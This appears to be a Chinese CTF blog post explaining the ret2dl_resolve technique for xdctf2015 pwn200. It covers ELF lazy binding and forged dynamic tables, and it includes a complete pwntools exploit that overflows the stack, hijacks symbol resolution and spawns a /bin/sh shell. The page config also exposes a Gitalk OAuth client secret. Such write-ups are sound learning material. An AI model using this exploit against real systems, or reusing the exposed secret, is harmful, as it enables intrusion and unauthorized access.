@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/a.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/a.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Consolas:300,300italic,400,400italic,700,700italic|隶书:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ll1ng.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="&amp;emsp;&amp;emsp;好久不见呀~">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dl_resolve">
+<meta property="og:url" content="http://ll1ng.github.io/2021/03/28/ret2dl-resolve/index.html">
+<meta property="og:site_name" content="here&#39;s ling&#39;s blog">
+<meta property="og:description" content="&amp;emsp;&amp;emsp;好久不见呀~">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-03-27T17:23:52.000Z">
+<meta property="article:modified_time" content="2021-04-11T11:20:24.752Z">
+<meta property="article:author" content="ling">
+<meta property="article:tag" content="stack">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://ll1ng.github.io/2021/03/28/ret2dl-resolve/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ret2dl_resolve | here's ling's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="here's ling's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">here's ling's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">月が绮丽ですね</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">6</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">6</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://ll1ng.github.io/2021/03/28/ret2dl-resolve/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/%E7%A9%B9.jpg">
+      <meta itemprop="name" content="ling">
+      <meta itemprop="description" content="永远不要停止思考啊">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="here's ling's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ret2dl_resolve
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-28 01:23:52" itemprop="dateCreated datePublished" datetime="2021-03-28T01:23:52+08:00">2021-03-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-11 19:20:24" itemprop="dateModified" datetime="2021-04-11T19:20:24+08:00">2021-04-11</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>&emsp;&emsp;好久不见呀~<a id="more"></a><br><br><br>&emsp;&emsp;<code>ret2dl_resolve</code>与<code>FSOP</code>等同属于伪造结构体这种利用思路。（简单地划分在栈入门题里我觉得不是很合适…当然一定是因为我菜）本篇记录我调试的详细过程。题目是<code>xdctf2015</code>的<code>pwn200</code></p>
+<h3 id="原理部分"><a href="#原理部分" class="headerlink" title="原理部分"></a>原理部分</h3><p>&emsp;&emsp;笔者理解过程主要依靠《程序员的自我修养》和《understanding elf》。<del>活久见！<code>ling</code>居然看书le</del> 下功夫去读源码自己构造是想依此来对动态链接过程有一个深刻的认识。学习结构体伪造这类利用方法时发现看源码应该是个必要的步骤…对结构体成员不熟悉很容易觉得题解天书。书本已经讲得比较详细了，再去引用难免有拾人牙慧之嫌。下面只记录一下自己的理解。<br><br>&emsp;&emsp;延迟绑定机制使得程序能够只为实际运行过程中被调用的符号进行绑定，且只在这些符号第一次被调用时花费时间去绑定，这能够有效提升程序运行速度减少不必要的资源浪费。实现这一过程的关键函数是<code>dl_runtime</code>。</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>&emsp;&emsp;一开始尝试自己构造<code>link_map</code>的时候因为和构造段表的地方重叠，思路过于混乱，无数次在<code>_dl_runtime_resolve</code>中被检测到段错误非常心累。于是本辣鸡选择改掉原<code>link_map</code>中用来定位符号表、字符串表、重定位表的3个字段<code>link_map-&gt;l_info[DT_SYMTAB]</code>，<code>l_info[DT_STRTAB]</code>,<code>l_info[DT_JMPREL]</code>使它们指向我构造的三个表。<br><br>&emsp;&emsp;第一次链接时，向<code>dl_runtime</code>传入两个参数，一个是<code>link_map</code>，另一个是偏移<code>reloc_arg</code>。（这里不太明白<code>gdb</code>里看到是<code>_dl_runtime_resolve</code>，去<code>elf/dl-runtime.c</code>里看却好像是<code>_dl_fixup</code>）。总之<code>_dl_fixup</code>函数先通过对<code>link_map-&gt;l_info</code>表的索引获得三个表的地址。</p>
+<blockquote>
+<p>三个表的定义位于<code>elf/elf.h</code>中。</p>
+</blockquote>
+<p>指向这三个表的指针被存放在<code>l_info</code>数组中，其结构为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Sword	d_tag;			&#x2F;* Dynamic entry type *&#x2F;</span><br><span class="line">  union</span><br><span class="line">    &#123;</span><br><span class="line">      Elf32_Word d_val;			&#x2F;* Integer value *&#x2F;</span><br><span class="line">      Elf32_Addr d_ptr;			&#x2F;* Address value *&#x2F;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;这个结构体中<code>d_ptr</code>指向的就是表真正所在的地址。<br><br>&emsp;&emsp;<code>l_info[5]</code>：字符串表。直接用下标索引，不同字符串之间用<code>\0</code>分隔<br><br>&emsp;&emsp;<code>l_info[6]</code>：符号表。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word	st_name;		&#x2F;* Symbol name (string tbl index) *&#x2F;</span><br><span class="line">  Elf32_Addr	st_value;		&#x2F;* Symbol value *&#x2F;</span><br><span class="line">  Elf32_Word	st_size;		&#x2F;* Symbol size *&#x2F;</span><br><span class="line">  unsigned char	st_info;		&#x2F;* Symbol type and binding *&#x2F;</span><br><span class="line">  unsigned char	st_other;		&#x2F;* Symbol visibility *&#x2F;</span><br><span class="line">  Elf32_Section	st_shndx;		&#x2F;* Section index *&#x2F;</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>
+<p><br>&emsp;&emsp;<code>l_info[23]</code>：重定位表。（还有一个结构叫<code>Elf32_Rela</code>不知道区别是什么）<code>r_info&gt;&gt;4</code>得到其在符号表中的下标，检测<code>r_info&lt;&lt;4</code>是否和某个值相等，代码为<code>assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</code>后面的宏和平台架构有关。（所以F12直接得到的1026并不正确）其值在<code>sysdeps/i386/dl-machine.h</code>中可以找到，为7。<br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Addr	r_offset;		&#x2F;* Address *&#x2F;</span><br><span class="line">  Elf32_Word	r_info;			&#x2F;* Relocation type and symbol index *&#x2F;</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;整体流程为，由第二个参数<code>reloc_arg</code>加上重定位表地址得到对应的重定位表（加的时候加的应该不是<code>sizeof(Elf32_Rel)*reloc_arg</code>，直接就是<code>reloc_arg</code>）；由该重定位表的<code>r_info</code>得到其在符号表中下标；从符号表中的<code>st_name</code>字段得到对应的字符串地址，再从库中找到字符串所在地址填入对应重定位表的<code>r_offset</code>字段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *;from LibcSearcher import *</span><br><span class="line">name&#x3D;&#39;.&#x2F;pwn200&#39;</span><br><span class="line">f&#x3D;ELF(name)</span><br><span class="line">if args.G:</span><br><span class="line">    p&#x3D;remote(&quot;pwn.challenge.lctf.online&quot;,10002)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(name)</span><br><span class="line">#context(os&#x3D;&#39;linux&#39;,arch&#x3D;&#39;amd64&#39;,log_level&#x3D;&#39;debug&#39;)</span><br><span class="line">context(os&#x3D;&#39;linux&#39;,arch&#x3D;&#39;i386&#39;,log_level&#x3D;&#39;debug&#39;)</span><br><span class="line">#context.terminal &#x3D; [&#39;tmux&#39; , &#39;splitw&#39; , &#39;-h&#39;]</span><br><span class="line">one&#x3D;[0x4527a,0x45226,0xf0364,0xf1207]</span><br><span class="line">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class="line">sa      &#x3D; lambda delim,data         :p.sendafter(delim, str(data))</span><br><span class="line">sl      &#x3D; lambda data               :p.sendline(data)</span><br><span class="line">sla     &#x3D; lambda delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       &#x3D; lambda num          :p.recv(num)</span><br><span class="line">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class="line">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\0&#39;))</span><br><span class="line">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\0&#39;))</span><br><span class="line">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class="line">l	&#x3D; lambda x		:log.success(x)</span><br><span class="line">dbg &#x3D; lambda :gdb.attach(p,&#39;b *0x8048376&#39;)</span><br><span class="line"></span><br><span class="line">bss&#x3D;0x0804a000</span><br><span class="line">ret&#x3D;0x80484bd</span><br><span class="line">resolve&#x3D;0x8048376</span><br><span class="line">main&#x3D;0x80484be</span><br><span class="line"></span><br><span class="line">str_offset&#x3D;0xcc</span><br><span class="line">sym_offset&#x3D;0xd4</span><br><span class="line">rel_offset&#x3D;0xf4</span><br><span class="line">link_map&#x3D;0x8049ff8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake&#x3D;flat(0,0,# 0x0</span><br><span class="line">0,0,0,0,0,0,0,0,0,# .dynamic 0x8</span><br><span class="line">0,0,# bss+0x42c</span><br><span class="line">0,0,# bss+0x434</span><br><span class="line">0,0,# bss+0x43c</span><br><span class="line">0,0,# bss+0x444</span><br><span class="line">0,bss+0x400+str_offset,   # bss+0x44c[5]</span><br><span class="line">0,bss+0x400+sym_offset,	  # bss+0x454[6]</span><br><span class="line">0xa,0x64, # bss+0x45c</span><br><span class="line">0xb,0x10, # bss+0x464</span><br><span class="line">0x15,bss+0x48c, # in libc bss+0x46c</span><br><span class="line">3,0x8049ff4, # bss+0x474</span><br><span class="line">bss+0x48c, 0x28, # bss+0x47c</span><br><span class="line">0x14,0x11,	 # bss +0x484</span><br><span class="line">0x0,bss+0x400+rel_offset,#17 jmprel  bss+0x48c[23]</span><br><span class="line">0x11,0x8048300,  # bss+0x494</span><br><span class="line">bss+0x400+rel_offset-0x10,0x18,  # bss+0x49c</span><br><span class="line">0x13,0x8,    # bss+0x4a4</span><br><span class="line">0x6ffffffe,0x80482e0, # bss+0x4ac</span><br><span class="line">0x6fffffff,0x1,  # bss+0x4b4</span><br><span class="line">0,0,  # bss+0x4bc</span><br><span class="line">0,0,                   # bss+0x4c4</span><br><span class="line">&#39;system\0\0&#39;,# strtab    bss+0x4cc</span><br><span class="line">0,0,0,&#39;\0\0\0\0&#39;,0,0,0,&#39;\x00\0\0\0&#39;,# symtab  bss+0x4d4</span><br><span class="line">f.got[&#39;read&#39;],0x107, #rel bss+0x4f4</span><br><span class="line">&#39;&#x2F;bin&#x2F;sh\0&#39;# 0x4fc</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def change(addr,value,length&#x3D;4):</span><br><span class="line">	sla(&#39;2015~!\n&#39;,0x6c*&#39;a&#39;+flat(0,f.plt[&#39;read&#39;],main,0,addr,length))</span><br><span class="line">	s(p32(value))</span><br><span class="line"></span><br><span class="line">sla(&#39;2015~!\n&#39;,0x6c*&#39;a&#39;+flat(0,f.plt[&#39;read&#39;],main,0,bss+0x400,0x200))</span><br><span class="line">pause(2)</span><br><span class="line">sl(fake)</span><br><span class="line"></span><br><span class="line">sla(&#39;2015~!\n&#39;,0x6c*&#39;a&#39;+flat(0,f.plt[&#39;write&#39;],main,1,link_map,4))</span><br><span class="line">head&#x3D;uu32(p.recv(4))</span><br><span class="line">log.info(&#39;head:&#39;+hex(head))</span><br><span class="line"></span><br><span class="line">#change(head+8,bss+0x42c) # 后来发现这句也不必要</span><br><span class="line">change(head+0x20+20,bss+0x44c,bss+0x4f4)</span><br><span class="line">change(head+0x24+20,bss+0x454)</span><br><span class="line">change(head+0x60+28,bss+0x48c)</span><br><span class="line">sla(&#39;2015~!\n&#39;,0x6c*&#39;a&#39;+flat(bss+0x400,resolve,head,0,0,bss+0x4fc))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;但这种做法当程序关闭输出流时便不奏效了，可拓展性很差。目前还在摸索怎么自己构造<code>link_map</code>。。下次一定！</p>
+
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+		<script>
+		var gitalkConfig = {"clientID":"0324b72a8577ea998218","clientSecret":"5e75c103ffafadd523fe6228fad280b3ec5a4972","repo":"comments","owner":"ll1ng","admin":["ll1ng"],"distractionFreeMode":false};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/stack/" rel="tag"># stack</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/19/forensics/" rel="prev" title="弘联杯甘政法">
+      <i class="fa fa-chevron-left"></i> 弘联杯甘政法
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理部分"><span class="nav-number">1.</span> <span class="nav-text">原理部分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调试"><span class="nav-number">2.</span> <span class="nav-text">调试</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ling"
+      src="/images/%E7%A9%B9.jpg">
+  <p class="site-author-name" itemprop="name">ling</p>
+  <div class="site-description" itemprop="description">永远不要停止思考啊</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ll1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ll1ng" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://ll1ng.github.io/atom.xml" title="rss → https:&#x2F;&#x2F;ll1ng.github.io&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>rss</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      小伙伴们>.<
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.wootec.top/" title="https:&#x2F;&#x2F;www.wootec.top&#x2F;" rel="noopener" target="_blank">Reverier</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://arttnba3.cn/" title="https:&#x2F;&#x2F;arttnba3.cn&#x2F;" rel="noopener" target="_blank">arttnba3</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://mercer5.github.io/" title="https:&#x2F;&#x2F;mercer5.github.io&#x2F;" rel="noopener" target="_blank">mercer</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://yoursite.com/" title="http:&#x2F;&#x2F;yoursite.com" rel="noopener" target="_blank">...</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+    <!--music-->
+    <div>
+    
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=446935665&auto=0&height=66"></iframe>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ling</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+  <script data-pjax>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+</body>
+</html>
